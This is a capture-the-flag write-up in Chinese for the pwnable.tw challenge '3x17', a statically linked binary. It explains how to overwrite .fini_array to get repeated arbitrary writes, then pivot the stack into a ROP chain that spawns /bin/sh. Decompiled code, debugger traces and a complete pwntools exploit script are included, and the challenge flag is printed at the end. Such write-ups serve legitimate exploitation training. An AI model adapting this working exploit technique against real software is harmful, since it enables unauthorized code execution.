# 3x17

```
user@vm-ubuntu20:~/tw$ checksec 3x17
[*] '/home/user/tw/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

只能寫一次
```
user@vm-ubuntu20:~/tw$ ./3x17 
addr:k
data:k
```

```c 
__int64 sub_401B6D()
{
  __int64 result; // rax
  char *v1; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    sub_446EC0(1u, "addr:", 5uLL);
    sub_446E20(0, buf, 0x18uLL);
    v1 = (char *)(int)sub_40EE70(buf);
    sub_446EC0(1u, "data:", 5uLL);
    sub_446E20(0, v1, 0x18uLL);
    result = 0LL;
  }
  if ( __readfsqword(0x28u) != v3 )
    sub_44A3E0();
  return result;
}

void __noreturn sub_44A3E0()
{
  sub_44A400(0LL, "stack smashing detected");
}

// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  unsigned int nn_argc; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  void *retaddr; // [rsp+0h] [rbp+0h] BYREF

  nn_argc = v5;
  v5 = v3;
  nn_libc_start_main(
    (__int64 (__fastcall *)(_QWORD, __int64, __int64))nn_main,
    nn_argc,
    (__int64)&retaddr,
    (void (__fastcall *)(_QWORD, __int64, __int64))sub_4028D0,
    (__int64)sub_402960,
    a3,
    (__int64)&v5);
}

__int64 sub_402960()
{
  signed __int64 v0; // rbx

  if ( (&unk_4B4100 - (_UNKNOWN *)off_4B40F0) >> 3 )
  {
    v0 = ((&unk_4B4100 - (_UNKNOWN *)off_4B40F0) >> 3) - 1;
    do
      off_4B40F0[v0--]();
    while ( v0 != -1 );
  }
  return term_proc();
}



.init_array:00000000004B40E0 ; ===========================================================================
.init_array:00000000004B40E0
.init_array:00000000004B40E0 ; Segment type: Pure data
.init_array:00000000004B40E0 ; Segment permissions: Read/Write
.init_array:00000000004B40E0 _init_array     segment qword public 'DATA' use64
.init_array:00000000004B40E0                 assume cs:_init_array
.init_array:00000000004B40E0                 ;org 4B40E0h
.init_array:00000000004B40E0 funcs_402908    dq offset sub_401B40    ; DATA XREF: sub_4028D0+2↑o
.init_array:00000000004B40E0                                         ; sub_4028D0+B↑o ...
.init_array:00000000004B40E8                 dq offset sub_4015B0
.init_array:00000000004B40E8 _init_array     ends
.init_array:00000000004B40E8
.fini_array:00000000004B40F0 ; ===========================================================================
.fini_array:00000000004B40F0
.fini_array:00000000004B40F0 ; Segment type: Pure data
.fini_array:00000000004B40F0 ; Segment permissions: Read/Write
.fini_array:00000000004B40F0 _fini_array     segment qword public 'DATA' use64
.fini_array:00000000004B40F0                 assume cs:_fini_array
.fini_array:00000000004B40F0                 ;org 4B40F0h
.fini_array:00000000004B40F0 off_4B40F0      dq offset sub_401B00    ; DATA XREF: sub_4028D0+4C↑o
.fini_array:00000000004B40F0                                         ; sub_402960+8↑o
.fini_array:00000000004B40F8                 dq offset sub_401580
.fini_array:00000000004B40F8 _fini_array     ends
.fini_array:00000000004B40F8
.data.rel.ro:00000000004B4100 ; ===========================================================================
.data.rel.ro:00000000004B4100
.data.rel.ro:00000000004B4100 ; Segment type: Pure data
.data.rel.ro:00000000004B4100 ; Segment permissions: Read/Write
.data.rel.ro:00000000004B4100 _data_rel_ro    segment align_32 public 'DATA' use64
.data.rel.ro:00000000004B4100                 assume cs:_data_rel_ro
.data.rel.ro:00000000004B4100                 ;org 4B4100h
.data.rel.ro:00000000004B4100 unk_4B4100      db    2                 ; DATA XREF: sub_402960+1↑o
.data.rel.ro:00000000004B4100                                         ; sub_40EBF0:loc_40ECC8↑o ...
```


這邊利用 __libc_start_main 呼叫 main 函數

https://refspecs.linuxbase.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html

__libc_csu_init執行.init和.init_array 

__libc_csu_fini執行.fini和.fini_array

執行流程
```
.init
.init_array[0]
…
.init_array[n]
main
.fini_array[n]
…
.fini_array[0]
.fini
```
可以劫持 .fini_array[1] 覆蓋成main，.fini_array[0]覆蓋成 __libc_csu_fini

這樣就可以達到多次寫入

>ROPgadget --binary calc --ropchain

這邊還要用到 stack migration，需要可控的 rbp

在 fini 函數中呼叫 fini_array 的函數之前把 rbp push 後，將fini_aray的地址存入rbp中

```c
.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, off_4B40F0 // here
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
.text:000000000040298C                 sub     rbx, 1
.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
.text:0000000000402994                 jnz     short loc_402988
.text:0000000000402996
.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j
.text:0000000000402996                 add     rsp, 8
.text:000000000040299A                 pop     rbx
.text:000000000040299B                 pop     rbp
.text:000000000040299C                 jmp     _term_proc
.text:000000000040299C ; } // starts at 402960
.text:000000000040299C sub_402960      endp
```

可以把 rop 寫到 .data.rel.ro ，因為在 fini_array 下面

這樣最後寫完，fini_array[0][1] 變成 leave_ret ret ， leave_ret 使 rsp 為 0x4b4100 之後在 ret 跳上 0x4b4100

```
修改fini_array[0][1] 後
 ► 0x402988    call   qword ptr [rbp + rbx*8]       <0x401c4b>

 ► 0x401c4b    leave  
   0x401c4c    ret    
    ↓
   0x401016    ret    
    ↓
   0x406c30    pop    rsi
   0x406c31    ret    
    ↓
   0x41e4af    pop    rax

*RBP  0x401c4b ◂— leave 
*RSP  0x4b40f8 —▸ 0x401016 ◂— ret 
*RIP  0x401c4c ◂— ret 
───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
   0x401c33    jmp    0x401c37                      <0x401c37>
    ↓
   0x401c37    mov    rcx, qword ptr [rbp - 8]
   0x401c3b    xor    rcx, qword ptr fs:[0x28]
   0x401c44    je     0x401c4b                      <0x401c4b>
    ↓
   0x401c4b    leave  
 ► 0x401c4c    ret    <0x401016>
    ↓
   0x401016    ret    
    ↓
   0x406c30    pop    rsi
   0x406c31    ret    
    ↓
   0x41e4af    pop    rax
   0x41e4b0    ret    
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ rsp 0x4b40f8 —▸ 0x401016 ◂— ret 
01:0008│     0x4b4100 —▸ 0x406c30 ◂— pop rsi
02:0010│     0x4b4108 —▸ 0x4b70e0 ◂— 0x0
03:0018│     0x4b4110 —▸ 0x41e4af ◂— pop rax
04:0020│     0x4b4118 ◂— 0x68732f2f6e69622f ('/bin//sh')
05:0028│     0x4b4120 —▸ 0x47c1b1 ◂— mov qword ptr [rsi], rax
06:0030│     0x4b4128 —▸ 0x406c30 ◂— pop rsi
07:0038│     0x4b4130 —▸ 0x4b70e8 ◂— 0x0
```

```
 RBP  0x401c4b ◂— leave 
*RSP  0x4b4100 —▸ 0x406c30 ◂— pop rsi
*RIP  0x401016 ◂— ret 
───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
   0x401c37    mov    rcx, qword ptr [rbp - 8]
   0x401c3b    xor    rcx, qword ptr fs:[0x28]
   0x401c44    je     0x401c4b                      <0x401c4b>
    ↓
   0x401c4b    leave  
   0x401c4c    ret    
    ↓
 ► 0x401016    ret    <0x406c30>
    ↓
   0x406c30    pop    rsi
   0x406c31    ret    
    ↓
   0x41e4af    pop    rax
   0x41e4b0    ret    
    ↓
   0x47c1b1    mov    qword ptr [rsi], rax
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ rsp 0x4b4100 —▸ 0x406c30 ◂— pop rsi
01:0008│     0x4b4108 —▸ 0x4b70e0 ◂— 0x0
02:0010│     0x4b4110 —▸ 0x41e4af ◂— pop rax
03:0018│     0x4b4118 ◂— 0x68732f2f6e69622f ('/bin//sh')
04:0020│     0x4b4120 —▸ 0x47c1b1 ◂— mov qword ptr [rsi], rax
05:0028│     0x4b4128 —▸ 0x406c30 ◂— pop rsi
06:0030│     0x4b4130 —▸ 0x4b70e8 ◂— 0x0
07:0038│     0x4b4138 —▸ 0x442110 ◂— xor rax, rax
```


exploit

ropchain 還可以更短
```python
from pwn import *
from struct import pack
# context.log_level = 'DEBUG'
context(log_level="debug")

p = b''

p += pack('<Q', 0x0000000000406c30) # pop rsi ; ret
p += pack('<Q', 0x00000000004b70e0) # @ .data
p += pack('<Q', 0x000000000041e4af) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047c1b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000406c30) # pop rsi ; ret
p += pack('<Q', 0x00000000004b70e8) # @ .data + 8
p += pack('<Q', 0x0000000000442110) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047c1b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401696) # pop rdi ; ret
p += pack('<Q', 0x00000000004b70e0) # @ .data
p += pack('<Q', 0x0000000000406c30) # pop rsi ; ret
p += pack('<Q', 0x00000000004b70e8) # @ .data + 8
p += pack('<Q', 0x0000000000446e35) # pop rdx ; ret
p += pack('<Q', 0x00000000004b70e8) # @ .data + 8
p += pack('<Q', 0x0000000000442110) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471810) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004022b4) # syscall


# print(p)

def send(addr, data):
    r.recv()
    r.send(str(addr))
    r.recv()
    r.send(data)

fini_array = 0x4B40F0

main_func = 0x401B6D
fini_func = 0x402960

leave_ret = 0x401C4B
ret = 0x401016

data_rel_ro = 0x4B4100



r = process("./3x17")
# r = remote("chall.pwnable.tw", 10105)
input(":::::")
send(fini_array, p64(fini_func) + p64(main_func))
for i in range(0,76):
    send(data_rel_ro+8*i, p[ 8*i : 8*i +8])
send(fini_array,p64(leave_ret)+p64(ret))



r.interactive()
```


> FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
